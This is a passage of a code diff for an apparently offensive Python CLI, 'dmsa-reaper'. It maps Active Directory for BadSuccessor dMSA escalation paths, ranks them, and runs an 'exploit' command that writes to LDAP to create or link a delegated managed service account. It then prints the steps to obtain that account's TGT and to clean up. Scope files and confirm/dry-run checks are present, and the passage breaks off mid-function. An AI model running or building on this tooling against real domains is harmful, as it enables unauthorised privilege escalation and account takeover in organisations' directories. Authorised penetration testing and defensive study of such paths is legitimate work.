+        operation.metadata["scope_allow_broad_dacl"] = scope_allow_broad_dacl
+    if operation.primitive == "existing-dmsa-legacy-link":
+        operation.metadata["allow_existing_dmsa_legacy_link"] = True
+
+    if state.current_principal:
+        operation.metadata["principal_sid"] = state.current_principal.sid
+    if state.schema_cache.attr_guids:
+        operation.metadata["attr_guids"] = state.schema_cache.attr_guids
+    if state.schema_cache.dmsa_class_guid:
+        operation.metadata["dmsa_class_guid"] = state.schema_cache.dmsa_class_guid
+
+    dmsa_dn = selected_path.get("dmsa_dn")
+    if dmsa_dn:
+        operation.metadata.setdefault("dmsa_dn", dmsa_dn)
+        mapped_dmsa = next(
+            (
+                item
+                for item in state.dmsas
+                if item.dn.lower() == str(dmsa_dn).lower()
+            ),
+            None,
+        )
+        if mapped_dmsa and mapped_dmsa.sam:
+            operation.metadata["dmsa_sam"] = mapped_dmsa.sam
+
+    domain = state.environment.domain
+    if domain:
+        operation.metadata["domain"] = domain.lower()
+        operation.metadata["realm"] = domain.upper()
+    operation.metadata["dc_host"] = dc_host
+    operation.metadata["dc_ip"] = dc_ip
+
+
+def _print_exploit_result(operation: Operation) -> None:
+    metadata = operation.metadata
+    path = metadata.get("path")
+    path = path if isinstance(path, dict) else {}
+    created_dn = metadata.get("created_dmsa_dn")
+    created_sam = metadata.get("created_dmsa_sam")
+    dmsa_dn = metadata.get("dmsa_dn") or path.get("dmsa_dn")
+    dmsa_sam = metadata.get("dmsa_sam")
+    target = metadata.get("target_dn") or path.get("target_dn")
+
+    lines: list[str] = []
+    if created_dn:
+        lines.append(f"[bold]dMSA DN[/bold]  {created_dn}")
+    elif dmsa_dn:
+        lines.append(f"[bold]dMSA DN[/bold]  {dmsa_dn}")
+    if created_sam or dmsa_sam:
+        lines.append(f"[bold]dMSA SAM[/bold] {created_sam or dmsa_sam}")
+    if target:
+        lines.append(f"[bold]Target[/bold]   {target}")
+    lines.extend(
+        [
+            "",
+            f"Get the dMSA TGT: dmsa-reaper tgt --op {operation.id} "
+            "--ccache <operator.ccache> --identity <operator>",
+            f"Cleanup: dmsa-reaper cleanup --op {operation.id}",
+        ]
+    )
+    print(
+        Panel(
+            "\n".join(lines),
+            title="[green]exploit complete[/green]",
+            subtitle=f"operation {operation.id}",
+            expand=False,
+        )
+    )
+
+
+_OPT_DC_IP = typer.Option(None, "--dc-ip", help="Domain controller IP.")
+_OPT_DC_HOST = typer.Option(None, "--dc-host", help="Domain controller hostname.")
+_OPT_USER = typer.Option(None, "--username", "-u", help="Username.")
+_OPT_PASS = typer.Option(None, "--password", "-p", help="Password.")
+_OPT_KRB = typer.Option(False, "--kerberos", "-k", help="Use KRB5CCNAME.")
+_OPT_LDAPS = typer.Option(False, "--use-ldaps", help="Use LDAPS on port 636.")
+_OPT_STARTTLS = typer.Option(False, "--start-tls", help="Use STARTTLS on port 389.")
+
+
 @app.command("map")
 def map_cmd(
-    domain: str = _OPT_DOMAIN,
+    domain: str = typer.Option(..., "--domain", "-d", help="Target domain FQDN."),
     dc_ip: Optional[str] = _OPT_DC_IP,
     dc_host: Optional[str] = _OPT_DC_HOST,
     username: Optional[str] = _OPT_USER,
@@ -794,722 +448,245 @@ def map_cmd(
     kerberos: bool = _OPT_KRB,
     use_ldaps: bool = _OPT_LDAPS,
     start_tls: bool = _OPT_STARTTLS,
-    sdflags: str = typer.Option(hex(DEFAULT_SD_FLAGS), "--sdflags"),
-    try_sacl: bool = typer.Option(
-        False,
-        "--try-sacl",
-        help="Try SACL retrieval in addition to owner+DACL; unreadable SACLs fall back.",
-    ),
-    target_filter: Optional[str] = typer.Option(None, "--target-filter", help="Extra LDAP filter for targets."),
     target: Optional[str] = typer.Option(
-        None, "--target", help="Limit discovery to one target by sAMAccountName, SID, or DN."
+        None,
+        "--target",
+        help="Limit targets to one sAMAccountName, SID, or DN.",
+    ),
+    target_filter: Optional[str] = typer.Option(
+        None,
+        "--target-filter",
+        help="Additional LDAP filter for target accounts.",
     ),
     container_filter: Optional[str] = typer.Option(
         None,
         "--container-filter",
-        help="Extra LDAP filter for containers.",
+        help="Additional LDAP filter for containers.",
     ),
-    max_targets: Optional[int] = typer.Option(None, "--max-targets", help="Limit target enumeration."),
+    max_targets: Optional[int] = typer.Option(
+        None,
+        "--max-targets",
+        help="Maximum target accounts to enumerate.",
+    ),
     only_current_principal: bool = typer.Option(
         False,
         "--only-current-principal",
-        help="Only enumerate a target object whose SID matches the current principal.",
+        help="Enumerate only the authenticated account as a target.",
     ),
-    json_out: Path = typer.Option(Path("state.json"), "--json"),
-    offline_fixture: Optional[Path] = typer.Option(None, "--offline-fixture"),
-):
-    """Map dMSA-relevant AD state and write JSON state."""
-    if offline_fixture:
-        state = load_offline_fixture(offline_fixture)
-    else:
-        if kerberos and not username:
-            raise typer.BadParameter(
-                "Kerberos mode requires --username for current principal SID/group expansion. "
-                "Without it, effective-rights mapping would be incomplete."
-            )
-        if target:
-            from ldap3.utils.conv import escape_filter_chars
-
-            escaped_target = escape_filter_chars(target)
-            if target.upper().startswith("S-1-"):
-                exact_filter = f"(objectSid={escaped_target})"
-            elif "," in target and "=" in target:
-                exact_filter = f"(distinguishedName={escaped_target})"
-            else:
-                exact_filter = f"(sAMAccountName={escaped_target})"
-            target_filter = (
-                f"(&{target_filter}{exact_filter})" if target_filter else exact_filter
-            )
-        cfg = _make_ldap_config(
-            domain, dc_ip, dc_host, username, password, kerberos, use_ldaps, start_tls
+    json_out: Path = typer.Option(Path("state.json"), "--json", help="State output."),
+) -> None:
+    """Map dMSAs, candidate targets, containers, and effective rights."""
+    if kerberos and not username:
+        raise typer.BadParameter(
+            "Kerberos mapping requires --username for SID and group resolution"
         )
-        state = run_live_map(
-            cfg,
-            sdflags=parse_int_auto(sdflags),
-            try_sacl=try_sacl,
-            target_filter=target_filter,
-            container_filter=container_filter,
-            max_targets=max_targets,
-            only_current_principal=only_current_principal,
+    if target:
+        from ldap3.utils.conv import escape_filter_chars
+
+        escaped = escape_filter_chars(target)
+        if target.upper().startswith("S-1-"):
+            exact_filter = f"(objectSid={escaped})"
+        elif "," in target and "=" in target:
+            exact_filter = f"(distinguishedName={escaped})"
+        else:
+            exact_filter = f"(sAMAccountName={escaped})"
+        target_filter = (
+            f"(&{target_filter}{exact_filter})"
+            if target_filter
+            else exact_filter
         )
 
+    state = run_live_map(
+        _make_ldap_config(
+            domain,
+            dc_ip,
+            dc_host,
+            username,
+            password,
+            kerberos,
+            use_ldaps,
+            start_tls,
+        ),
+        sdflags=DEFAULT_SD_FLAGS,
+        target_filter=target_filter,
+        container_filter=container_filter,
+        max_targets=max_targets,
+        only_current_principal=only_current_principal,
+    )
     state.save(json_out)
-    print(f"[green]wrote map state[/green] {json_out}")
-    print(f"dmsa_capable_status={state.environment.dmsa_capable_status}")
+    print(f"[green][+] State written:[/green] {json_out}")
+    print(
+        f"[*] dMSAs={len(state.dmsas)} "
+        f"containers={len(state.containers)} targets={len(state.targets)}"
+    )
 
 
 @app.command("paths")
 def paths_cmd(
-    state_path: Path = typer.Option(Path("state.json"), "--state"),
-    json_out: Optional[Path] = typer.Option(None, "--json"),
-    expand_targets: bool = typer.Option(
-        False, "--expand-targets",
-        help="Emit one row per (container, target) pair instead of grouping by container.",
+    state_path: Path = typer.Option(
+        Path("state.json"),
+        "--state",
+        help="Map state produced by the map command.",
     ),
     only: Optional[list[str]] = typer.Option(
         None,
         "--only",
-        help="Only show the named primitive. May be passed multiple times.",
+        help="Show only this primitive; repeat for multiple primitives.",
     ),
-    exclude_legacy: bool = typer.Option(
+    legacy: bool = typer.Option(
         False,
-        "--exclude-legacy",
-        help="Hide lab/legacy primitives.",
+        "--legacy",
+        help="Include pre-patch one-way-link paths.",
     ),
-    include_sensitive_targets: bool = typer.Option(
-        False,
-        "--include-sensitive-targets",
-        help="Reserved for explicit sensitive target inclusion; accepted for CLI stability.",
+    json_out: Optional[Path] = typer.Option(
+        None,
+        "--json",
+        help="Write paths as JSON.",
     ),
-    require_kerberos_ready: bool = typer.Option(
-        False,
-        "--require-kerberos-ready",
-        help="Block output if local Kerberos readiness checks are failing.",
-    ),
-    research: bool = typer.Option(
-        False,
-        "--research",
-        help="Include informational self-write-map and self-pkinit-loop findings.",
-    ),
-):
-    """Classify executable dMSA paths from map state."""
+) -> None:
+    """List ranked, executable BadSuccessor paths."""
     state = MapState.load(state_path)
-    _require_kerberos_ready_if_requested(state, require_kerberos_ready)
-    paths = classified_paths(
-        state,
-        expand_targets=expand_targets,
-        only=only,
-        exclude_legacy=exclude_legacy,
-        include_sensitive_targets=include_sensitive_targets,
-    )
-    if not research:
-        paths = [
-            path for path in paths if path.primitive not in {"self-write-map", "self-pkinit-loop"}
-        ]
-    if json_out:
-        json_out.write_text(
-            "[" + ",".join(p.model_dump_json(indent=2) for p in paths) + "]",
-            encoding="utf-8",
+    paths = rank_paths(classify_paths(state, expand_targets=True))
+    if not legacy:
+        has_postpatch_target = any(
+            _POSTPATCH_TARGET_ATTRS.issubset(set(target.writable_attrs))
+            for target in state.targets
         )
-        print(f"[green]wrote paths[/green] {json_out}")
+        paths = [
+            path
+            for path in paths
+            if path.primitive not in _LEGACY_PRIMITIVES
+            and (
+                path.primitive != "dacl-container-escalate"
+                or has_postpatch_target
+            )
+        ]
+    if only:
+        wanted = set(only)
+        paths = [path for path in paths if path.primitive in wanted]
+    if json_out:
+        _write_json(
+            json_out,
+            [path.model_dump(mode="json") for path in paths],
+        )
+        print(f"[green][+] Paths written:[/green] {json_out}")
     print_paths(paths)
 
 
-@app.command("doctor")
-def doctor_cmd(
-    domain: str = _OPT_DOMAIN,
+@app.command("exploit")
+def exploit_cmd(
+    path_id: str = typer.Option(..., "--path", help="Path ID from the paths command."),
+    state_path: Path = typer.Option(Path("state.json"), "--state"),
+    scope_file: Path = typer.Option(
+        ...,
+        "--scope",
+        help="JSON scope restricting LDAP writes.",
+    ),
+    confirm: bool = typer.Option(
+        False,
+        "--confirm",
+        help="Perform the LDAP writes.",
+    ),
+    dry_run: bool = typer.Option(
+        False,
+        "--dry-run",
+        help="Print the planned LDAP writes.",
+    ),
+    confirm_string: Optional[str] = typer.Option(
+        None,
+        "--confirm-string",
+        help="Scope domain when required by the scope file.",
+    ),
+    domain: Optional[str] = typer.Option(None, "--domain", "-d"),
     dc_ip: Optional[str] = _OPT_DC_IP,
     dc_host: Optional[str] = _OPT_DC_HOST,
     username: Optional[str] = _OPT_USER,
     password: Optional[str] = _OPT_PASS,
     kerberos: bool = _OPT_KRB,
     use_ldaps: bool = _OPT_LDAPS,
-    scope_file: Optional[Path] = typer.Option(None, "--scope", help="Optional scope file to validate."),
-    ops_dir: Optional[Path] = typer.Option(None, "--ops-dir", help="Operation log directory to test."),
-    json_out: Optional[Path] = typer.Option(None, "--json", help="Write doctor results as JSON."),
-):
-    """Check lab readiness and print actionable warnings."""
-    checks: list[dict] = []
-
-    def add_check(name: str, status: str, detail: str = "") -> None:
-        checks.append({"name": name, "status": status, "detail": detail})
-
-    configure_ops_dir(ops_dir)
-    try:
-        from dmsa_reaper.ops.operation_log import ensure_ops_dir
-        directory = ensure_ops_dir(ops_dir)
-        probe = directory / ".doctor-write-test"
-        probe.write_text("ok", encoding="utf-8")
-        probe.unlink()
-        add_check("operation-log-directory", "pass", str(directory))
-    except Exception as exc:
-        add_check("operation-log-directory", "fail", str(exc))
-
-    if scope_file:
-        try:
-            from dmsa_reaper.scope import load_scope
-            scope, digest = load_scope(scope_file)
-            add_check("scope-file", "pass", f"domain={scope.domain} sha256={digest}")
-        except Exception as exc:
-            add_check("scope-file", "fail", str(exc))
-
-    conn = None
-    root = None
-    try:
-        cfg = _make_ldap_config(domain, dc_ip, dc_host, username, password, kerberos, use_ldaps)
-        conn = bind(cfg)
-        add_check("ldap-bind", "pass", "bind succeeded")
-    except Exception as exc:
-        add_check("ldap-bind", "fail", str(exc))
-
-    if conn is not None:
-        try:
-            from dmsa_reaper.ldap.rootdse import read_rootdse
-            root = read_rootdse(conn)
-            add_check("rootdse", "pass", json.dumps(root))
-        except Exception as exc:
-            add_check("rootdse", "fail", str(exc))
-
-    schema_cache = None
-    if conn is not None and root is not None:
-        try:
-            schema_nc = root.get("schemaNamingContext")
-            config_nc = root.get("configurationNamingContext")
-            if not schema_nc or not config_nc:
-                raise RuntimeError("RootDSE missing schema/config naming context")
-            from dmsa_reaper.schema.resolver import SchemaResolver
-            schema_cache = SchemaResolver(conn, schema_nc, config_nc).resolve()
-            add_check("schema-guid-resolution", "pass", "schema resolver completed")
-            add_check(
-                "dmsa-class-present",
-                "pass" if schema_cache.dmsa_class_guid else "warning",
-                schema_cache.dmsa_class_guid or "dMSA class GUID not resolved",
-            )
-        except Exception as exc:
-            add_check("schema-guid-resolution", "fail", str(exc))
-
-    if conn is not None and schema_cache is not None:
-        try:
-            from dmsa_reaper.map.environment import build_environment
-            env = build_environment(conn, domain, schema_cache)
-            add_check("kds-root-key", env.kds_root_key_status.value, "")
-            add_check("server-2025-dc", env.server_2025_dc_status.value, "")
-            add_check("dmsa-capable", env.dmsa_capable_status.value, "")
-        except Exception as exc:
-            add_check("environment", "fail", str(exc))
-
-    dc_fqdn = None
-    if isinstance(root, dict):
-        dc_fqdn = root.get("dnsHostName") or dc_host
-    else:
-        dc_fqdn = dc_host
-
-    kerberos_diag = inspect_kerberos_environment(
-        domain=domain,
-        dc_ip=dc_ip,
-        dc_host=dc_host,
-        dc_fqdn=dc_fqdn,
-        run_cache_checks=kerberos,
-        attempt_cifs_ticket=kerberos,
-    )
-    dns_diag = inspect_dns_environment(domain=domain, dc_ip=dc_ip, dc_fqdn=dc_fqdn)
-    if kerberos_diag.time_skew_ok is False:
-        add_check(
-            "kerberos-time-skew",
-            "fail" if kerberos else "warning",
-            f"skew_seconds={kerberos_diag.time_skew_seconds}",
-        )
-    if kerberos_diag.ccache_style != "unset":
-        add_check("kerberos-ccache", "pass" if kerberos_diag.ccache_exists else "warning", kerberos_diag.ccache_style)
-    else:
-        add_check("kerberos-ccache", "warning", "KRB5CCNAME unset")
-    if dns_diag.srv_lookup_ok is False:
-        add_check(
-            "dns-srv",
-            "warning",
-            f"{dns_diag.srv_record}; recommended_nameserver={dns_diag.recommended_nameserver}",
-        )
-
-    summary = {
-        "ok": all(check["status"] not in {"fail", "error"} for check in checks),
-        "checks": checks,
-        "kerberos": kerberos_diag.to_json(),
-        "dns": dns_diag.to_json(),
-    }
-    if json_out:
-        json_out.write_text(json.dumps(summary, indent=2), encoding="utf-8")
-        print(f"[green]wrote doctor JSON[/green] {json_out}")
-    for check in checks:
-        print(f"{check['name']}: {check['status']} {check['detail']}".rstrip())
-    _print_kerberos_table(kerberos_diag.to_json(), dns_diag.to_json())
-
-
-def _print_kerberos_table(kerberos: dict, dns: dict) -> None:
-    table = Table(title="Kerberos readiness")
-    table.add_column("Check")
-    table.add_column("Value")
-    table.add_column("Status")
-    skew = kerberos.get("time_skew_seconds")
-    skew_ok = kerberos.get("time_skew_ok")
-    table.add_row(
-        "DC time skew",
-        "unknown" if skew is None else f"{skew}s",
-        "unknown" if skew_ok is None else ("OK" if skew_ok else "WARNING"),
-    )
-    table.add_row("KRB5CCNAME", str(kerberos.get("krb5ccname") or "unset"), str(kerberos.get("ccache_style")))
-    table.add_row("ccache exists", "yes" if kerberos.get("ccache_exists") else "no", "")
-    table.add_row("TGT principal", str(kerberos.get("tgt_principal") or "not inspected"), "")
-    cifs = kerberos.get("cifs_ticket")
-    cifs_status = cifs or kerberos.get("cifs_ticket_present") or "not inspected"
-    if kerberos.get("cifs_ticket_obtainable") is True:
-        cifs_status = f"{cifs_status} (obtained with kvno)"
-    table.add_row("CIFS ticket", str(cifs_status), "")
-    table.add_row(
-        "Impacket cache format",
-        "; ".join(kerberos.get("imp_errata") or []) or "no notes",
-        "OK" if kerberos.get("ccache_style") == "raw-file-path" else "CHECK",
-    )
-    table.add_row(
-        "DNS SRV",
-        str(dns.get("srv_record") or "unknown"),
-        "OK" if dns.get("srv_lookup_ok") else "WARNING",
-    )
-    print(table)
-    for warning in (kerberos.get("warnings") or []) + (dns.get("warnings") or []):
-        print(f"[yellow]warning:[/yellow] {warning}")
-
-
-@app.command("kerberos-doctor")
-def kerberos_doctor_cmd(
-    domain: str = _OPT_DOMAIN,
-    dc_ip: Optional[str] = _OPT_DC_IP,
-    dc_host: Optional[str] = _OPT_DC_HOST,
-    json_out: Optional[Path] = typer.Option(None, "--json", help="Write Kerberos readiness JSON."),
-):
-    """Inspect Kerberos cache/config/DNS readiness without LDAP writes."""
-    kerberos_diag = inspect_kerberos_environment(
-        domain=domain,
-        dc_ip=dc_ip,
-        dc_host=dc_host,
-        dc_fqdn=dc_host,
-        run_cache_checks=True,
-        attempt_cifs_ticket=True,
-    )
-    dns_diag = inspect_dns_environment(domain=domain, dc_ip=dc_ip, dc_fqdn=dc_host)
-    summary = {
-        "ok": (
-            kerberos_diag.time_skew_ok is not False
-            and kerberos_diag.ccache_style != "unset"
-            and dns_diag.srv_lookup_ok is not False
-        ),
-        "kerberos": kerberos_diag.to_json(),
-        "dns": dns_diag.to_json(),
-    }
-    if json_out:
-        _write_json(json_out, summary)
-        print(f"[green]wrote kerberos doctor JSON[/green] {json_out}")
-    _print_kerberos_table(kerberos_diag.to_json(), dns_diag.to_json())
-
-
-@app.command("lab-report")
-def lab_report_cmd(
-    state_path: Path = typer.Option(Path("state.json"), "--state"),
-    paths_file: Optional[Path] = typer.Option(None, "--paths"),
-    op_id: Optional[str] = typer.Option(None, "--op", help="Operation ID to include in lifecycle summary."),
-    ops_dir: Optional[Path] = typer.Option(
+    start_tls: bool = _OPT_STARTTLS,
+    target_dn: Optional[str] = typer.Option(
         None,
-        "--ops-dir",
-        help="Directory for operation logs (default: .reaper/operations or DMSA_REAPER_OPS_DIR).",
+        "--target-dn",
+        help="Target account DN for a path that requires one.",
     ),
-    json_out: Optional[Path] = typer.Option(None, "--json"),
-):
-    """Summarize a mapped lab state and path set."""
-    state = MapState.load(state_path)
-    paths: list[PathCandidate] = []
-    if paths_file:
-        raw = json.loads(paths_file.read_text(encoding="utf-8"))
-        paths = [PathCandidate.model_validate(p) for p in raw]
-    primitive_counts: dict[str, int] = {}
-    for path in paths:
-        primitive_counts[path.primitive] = primitive_counts.get(path.primitive, 0) + 1
-    warnings: list[str] = []
-    for collection in (state.dmsas, state.containers, state.targets):
-        for obj in collection:
-            warnings.extend(getattr(obj, "parse_warnings", []))
-    dc_fqdn = None
-    if state.environment.dcs:
-        dc_fqdn = state.environment.dcs[0].get("dnsHostName")
-    kerberos_diag = inspect_kerberos_environment(
-        domain=state.environment.domain or "",
-        dc_fqdn=dc_fqdn,
-        run_cache_checks=True,
-    )
-    dns_diag = inspect_dns_environment(domain=state.environment.domain or "", dc_fqdn=dc_fqdn)
-    operation_lifecycle: dict[str, Any] | None = None
-    notes: list[str] = []
-    if op_id:
-        configure_ops_dir(ops_dir)
-        op = load_operation(op_id)
-        ldap_status = None
-        external_status = None
-        if isinstance(op.metadata.get("ldap_verification"), dict):
-            ldap_status = op.metadata["ldap_verification"].get("status")
-        if isinstance(op.metadata.get("external_verification"), dict):
-            external_status = op.metadata["external_verification"].get("status")
-        failure_classes = []
-        for key in ("external_adapter", "external_verification", "kerberos_base_check"):
-            value = op.metadata.get(key)
-            if isinstance(value, dict) and value.get("failure_class"):
-                failure_classes.append(value["failure_class"])
-        if op.metadata.get("kerberos_base_check") and not op.verified_external:
-            failure_classes.append("kerberos-base-ok-dmsa-unknown")
-        operation_lifecycle = {
-            "operation_id": op.id,
-            "status": op.status,
-            "verified_ldap": op.verified_ldap,
-            "verified_external": op.verified_external,
-            "ldap_verification_status": ldap_status,
-            "external_verification_status": external_status,
-            "failure_classes": failure_classes,
-        }
-        if op.verified_ldap:
-            notes.append("LDAP state was verified historically.")
-        if op.metadata.get("kerberos_base_check"):
-            notes.append("Base Kerberos proof was recorded; it does not prove dMSA abuse.")
-        if not op.verified_external:
-            notes.append("No dMSA ticket proof recorded.")
-    base_ready = (
-        kerberos_diag.tgt_present is not False
-        and kerberos_diag.ccache_style not in {"unset", "keyring"}
-        and dns_diag.srv_lookup_ok is not False
-    )
-    report_failure_classes = sorted(set(
-        kerberos_diag.failure_classes
-        + dns_diag.failure_classes
-        + (operation_lifecycle.get("failure_classes", []) if operation_lifecycle else [])
-    ))
-    summary = {
-        "domain": state.environment.domain,
-        "dcs": state.environment.dcs,
-        "kds_root_key_status": state.environment.kds_root_key_status,
-        "dmsa_schema_status": state.environment.dmsa_schema_status,
-        "principal": state.current_principal.model_dump() if state.current_principal else None,
-        "path_counts_by_primitive": primitive_counts,
-        "sensitive_paths_filtered": "not tracked in this state version",
-        "warnings": warnings,
-        "operation_lifecycle": operation_lifecycle,
-        "kerberos": {
-            "base_ready": base_ready,
-            "dmsa_proof_verified": bool(operation_lifecycle and operation_lifecycle["verified_external"]),
-            "time_skew_ok": kerberos_diag.time_skew_ok,
-            "ccache_style": kerberos_diag.ccache_style,
-            "cifs_ticket_present": kerberos_diag.cifs_ticket_present,
-            "failure_classes": report_failure_classes,
-            "notes": notes,
-            "diagnostics": kerberos_diag.to_json(),
-            "dns": dns_diag.to_json(),
-        },
-        "recommended_next_steps": [
-            "Use LDAP verify for directory state and an operation-bound kerberos-dmsa-proof for ticket proof.",
-            "Use SYSVOL/NETLOGON for low-priv SMB Kerberos checks; C$ denial is expected for non-admin users.",
-        ],
-    }
-    if json_out:
-        json_out.write_text(json.dumps(summary, indent=2, default=str), encoding="utf-8")
-        print(f"[green]wrote lab report JSON[/green] {json_out}")
-    else:
-        print(json.dumps(summary, indent=2, default=str))
-
-
-def _print_exploit_result(op) -> None:
-    """Print post-exploitation handoff summary after a successful execute."""
-    meta = op.metadata
-    lines = []
-    created_dn = meta.get("created_dmsa_dn")
-    created_sam = meta.get("created_dmsa_sam")
-    eff_target = meta.get("target_dn") or (
-        meta.get("path", {}).get("target_dn") if isinstance(meta.get("path"), dict) else None
-    )
-    dmsa_dn = meta.get("dmsa_dn") or (
-        meta.get("path", {}).get("dmsa_dn") if isinstance(meta.get("path"), dict) else None
-    )
-
-    if created_dn:
-        lines.append(f"  [bold]created dMSA DN[/bold]    : {created_dn}")
-    if created_sam:
-        lines.append(f"  [bold]sAMAccountName [/bold]    : {created_sam}")
-    if eff_target:
-        lines.append(f"  [bold]target DN      [/bold]    : {eff_target}")
-    if dmsa_dn and not created_dn:
-        lines.append(f"  [bold]modified dMSA  [/bold]    : {dmsa_dn}")
-
-    lines.append("")
-    lines.append("  [dim]LDAP state was modified successfully.[/dim]")
-    lines.append(f"  [dim]Verify LDAP state: dmsa-reaper verify --op {op.id} ...[/dim]")
-    lines.append(
-        f"  [dim]Then acquire native proof: dmsa-reaper ticket --op {op.id} "
-        "--ccache <operator.ccache> --identity <operator> --service <spn>[/dim]"
-    )
-
-    print(Panel(
-        "\n".join(lines),
-        title="[green]exploit complete[/green]",
-        subtitle=f"operation {op.id} — run 'dmsa-reaper verify --op {op.id}' to confirm LDAP state",
-        expand=False,
-    ))
-
-
-@app.command("exploit")
-def exploit_cmd(
-    state_path: Path = typer.Option(Path("state.json"), "--state"),
-    paths_file: Optional[Path] = typer.Option(
-        None, "--paths",
-        help="paths.json produced by 'dmsa-reaper paths --json'. "
-             "When provided, path IDs are resolved from this file instead of recomputing from --state.",
-    ),
-    expand_targets: bool = typer.Option(
-        False, "--expand-targets",
-        help="Expand grouped paths into one row per target (must match the flag used with 'paths').",
-    ),
-    path_id: str = typer.Option(..., "--path"),
-    primitive_name: Optional[str] = typer.Option(None, "--primitive"),
-    confirm: bool = typer.Option(False, "--confirm"),
-    confirm_string: Optional[str] = typer.Option(
-        None,
-        "--confirm-string",
-        help="Required when scope.requireConfirmString is true; must equal scope.domain.",
-    ),
-    dry_run: bool = typer.Option(False, "--dry-run", help="Show planned writes; do not touch LDAP."),
-    scope_file: Optional[Path] = typer.Option(
-        None, "--scope",
-        help="Scope JSON file restricting which DNs may be touched.",
-    ),
-    ops_dir: Optional[Path] = typer.Option(
-        None,
-        "--ops-dir",
-        help="Directory for operation logs (default: .reaper/operations or DMSA_REAPER_OPS_DIR).",
-    ),
-    allow_broad_dacl: bool = typer.Option(
-        False, "--allow-broad-dacl",
-        help="For dacl-* primitives: use broad ACEs if object-specific GUIDs are unavailable.",
-    ),
-    allow_legacy_oneway_link: bool = typer.Option(
-        False,
-        "--allow-legacy-oneway-link",
-        help="Allow the lab/legacy one-sided pre-patch primitive.",
-    ),
-    allow_existing_dmsa_legacy_link: bool = typer.Option(
-        False,
-        "--allow-existing-dmsa-legacy-link",
-        help="Allow existing-dmsa-legacy-link, which writes only dMSA-side attributes.",
-    ),
-    allow_lab_environment: bool = typer.Option(
-        False,
-        "--allow-lab-environment",
-        help="Allow exploit --confirm when dMSA capability is absent or unknown in state.",
-    ),
-    allow_unmapped_target: bool = typer.Option(
-        False,
-        "--allow-unmapped-target",
-        help="Allow postpatch/DACL-target writes when --target-dn is not proven in state.targets.",
-    ),
-    allow_unmapped_container: bool = typer.Option(
-        False,
-        "--allow-unmapped-container",
-        help="Allow confirmed execution when the container DN is absent or lacks proven rights in state.",
-    ),
-    allow_unmapped_dmsa: bool = typer.Option(
-        False,
-        "--allow-unmapped-dmsa",
-        help="Allow confirmed execution when the dMSA DN is absent or lacks proven migration rights in state.",
-    ),
-    allow_grouped_target_selection: bool = typer.Option(
-        False,
-        "--allow-grouped-target-selection",
-        help="Allow --confirm with grouped paths that require operator-supplied --target-dn.",
-    ),
-    json_out: Optional[Path] = typer.Option(
-        None,
-        "--json",
-        help="Write machine-readable exploit result or dry-run preview as JSON.",
-    ),
-    # LDAP auth — required when --confirm is set.
-    domain: Optional[str] = typer.Option(None, "--domain", "-d", help="Target domain FQDN."),
-    dc_ip: Optional[str] = typer.Option(None, "--dc-ip", help="DC IP address."),
-    dc_host: Optional[str] = typer.Option(None, "--dc-host", help="DC hostname."),
-    username: Optional[str] = typer.Option(None, "--username", "-u", help="Bind username."),
-    password: Optional[str] = typer.Option(None, "--password", "-p", help="Bind password."),
-    kerberos: bool = typer.Option(False, "--kerberos", "-k", help="Use ccache (Kerberos)."),
-    use_ldaps: bool = typer.Option(False, "--use-ldaps", help="Connect over LDAPS (port 636)."),
-    start_tls: bool = typer.Option(False, "--start-tls", help="Upgrade LDAP with STARTTLS."),
-    # Primitive parameters.
-    target_dn: Optional[str] = typer.Option(None, "--target-dn", help="DN of the target account."),
     container_dn: Optional[str] = typer.Option(
-        None, "--container-dn",
-        help="OU/container where the new dMSA will be created "
-             "(required for dacl-target-escalate; optional override for other primitives).",
+        None,
+        "--container-dn",
+        help="Container for dMSA creation when the path does not supply one.",
     ),
     chain: Optional[str] = typer.Option(
-        None, "--chain",
-        help="Chain mode for dacl-container-escalate: 'legacy' or 'postpatch'. "
-             "Required for dacl-container-escalate. "
-             "postpatch additionally writes target-side superseded attrs after dMSA creation.",
+        None,
+        "--chain",
+        help="dacl-container chain: postpatch or legacy.",
     ),
-    dmsa_name: Optional[str] = typer.Option(None, "--dmsa-name", help="CN hint for the new dMSA."),
+    dmsa_name: Optional[str] = typer.Option(
+        None,
+        "--dmsa-name",
+        help="CN prefix for a newly created dMSA.",
+    ),
+    allow_broad_dacl: bool = typer.Option(
+        False,
+        "--allow-broad-dacl",
+        help="Use broad ACEs when schema GUIDs are unavailable; scope must allow it.",
+    ),
     cleanup_policy: str = typer.Option(
         "on-failure",
         "--cleanup-policy",
-        help="Cleanup behavior after a partial failure: on-failure | manual.",
+        help="Partial-failure cleanup: on-failure or manual.",
     ),
-
-):
-    """Plan/execute one selected primitive.
-
-    Use --dry-run to preview planned LDAP writes without binding.
-    LDAP writes require --confirm plus LDAP auth options.
-
-    Path ID resolution:
-      --paths paths.json   use IDs from a saved 'dmsa-reaper paths --json' output
-      --expand-targets     match IDs produced by 'dmsa-reaper paths --expand-targets'
-      (default)            match IDs produced by 'dmsa-reaper paths' (grouped mode)
-
-    Scope enforcement:
-      --scope scope.json   restrict which DNs may be created or modified
-    """
-    configure_ops_dir(ops_dir)
-
-    if confirm and dry_run:
-        raise typer.BadParameter("--confirm and --dry-run are mutually exclusive")
+    ops_dir: Optional[Path] = typer.Option(None, "--ops-dir"),
+    json_out: Optional[Path] = typer.Option(None, "--json"),
+) -> None:
+    """Preview or execute one mapped path."""
+    if confirm == dry_run:
+        raise typer.BadParameter("choose exactly one of --confirm or --dry-run")
     if cleanup_policy not in {"on-failure", "manual"}:
         raise typer.BadParameter("--cleanup-policy must be on-failure or manual")
-    if paths_file and expand_targets:
-        raise typer.BadParameter("--paths and --expand-targets are mutually exclusive")
-    if not confirm and not dry_run:
-        raise typer.BadParameter("Use --dry-run to preview or --confirm to perform LDAP writes")
 
-    # Load scope if provided.
-    scope = None
-    scope_hash: str | None = None
-    if scope_file:
-        from dmsa_reaper.scope import load_scope
-        scope, scope_hash = load_scope(scope_file)
-
-    state: MapState | None = None
-    if paths_file:
-        raw = json.loads(paths_file.read_text(encoding="utf-8"))
-        paths = rank_paths([PathCandidate.model_validate(p) for p in raw])
-        state_load_error: Exception | None = None
-        try:
-            state = MapState.load(state_path)
-            if scope is not None and state.environment.domain:
-                from dmsa_reaper.scope import check_domain_match
-                try:
-                    check_domain_match(state.environment.domain, scope)
-                except ValueError as exc:
-                    raise typer.BadParameter(str(exc)) from exc
-        except typer.BadParameter:
-            raise
-        except Exception as exc:
-            state_load_error = exc
-        if confirm and state is None and not allow_lab_environment:
-            raise typer.BadParameter(
-                f"--confirm with --paths requires a valid --state file: {state_load_error}"
-            )
-    else:
-        state = MapState.load(state_path)
-        # Validate scope domain against mapped domain.
-        if scope is not None and state.environment.domain:
